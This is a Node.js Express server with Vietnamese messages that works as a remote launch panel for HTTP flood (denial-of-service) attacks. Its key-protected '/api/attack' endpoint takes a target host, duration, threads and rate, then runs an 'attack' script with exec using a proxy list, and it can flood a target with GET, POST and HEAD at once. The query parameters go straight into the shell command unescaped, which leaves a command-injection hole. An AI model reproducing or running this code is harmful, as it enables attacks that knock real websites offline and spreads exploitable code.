const express = require("express"), { exec } = require("child_process");
const app = express(), port = 8080, MAX_CONCURRENT_ATTACKS = 1;
let activeAttacks = 0, currentPID = null;

const validateInput = ({ key, host, time, method, port }) => {
  if (![key, host, time, method, port].every(Boolean)) return "THIẾU THAM SỐ";
  if (key !== "negan") return "KEY KHÔNG HỢP LỆ";
  if (time > 300) return "THỜI GIAN PHẢI < 300S";
  if (port < 1 || port > 65535) return "CỔNG KHÔNG HỢP LỆ";
  return null;
};

const executeAttack = (command, res, host, port, time, method, modul) => {
  exec(command, (error, stdout, stderr) => {
    activeAttacks--; currentPID = null;
    if (stderr) console.error(stderr);
  });
  currentPID = Math.floor(Math.random() * 10000) + 1;

  let message = modul === "FULL" ? "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI" : "LỆNH TẤN CÔNG ĐÃ GỬI";
  let modulInfo = modul === "FULL" ? "GET POST HEAD" : modul;  // Hiển thị các phương thức nếu modul là FULL

  res.status(200).json({ 
    status: "SUCCESS", 
    message, 
    host, 
    port, 
    time, 
    modul: modulInfo,  // Thêm modul vào trong phản hồi
    method, 
    pid: currentPID 
  });
};

app.get("/api/attack", (req, res) => {
  const { key, host, time, method, port, modul, threads, rate } = req.query;
  if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID)
    return res.status(400).json({ status: "ERROR", message: "ĐANG CÓ CUỘC TẤN CÔNG KHÁC", statusCode: 400 });

  const validationMessage = validateInput({ key, host, time, method, port });
  if (validationMessage)
    return res.status(400).json({ status: "ERROR", message: validationMessage, statusCode: 400 });

  activeAttacks++;

  // Kiểm tra modul là FULL và gửi cả 3 lệnh GET, POST, HEAD
  if (modul === "FULL") {
    const methods = ["GET", "POST", "HEAD"];
    methods.forEach((method) => {
      const command = `node --max-old-space-size=65536 attack -m ${method} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
      executeAttack(command, res, host, port, time, method, modul);
    });
  } else {
    const command = `node --max-old-space-size=65536 attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
    executeAttack(command, res, host, port, time, method, modul);
  }
});

app.listen(port, () => console.log(`[API SERVER] CHẠY TẠI CỔNG ${port}`));
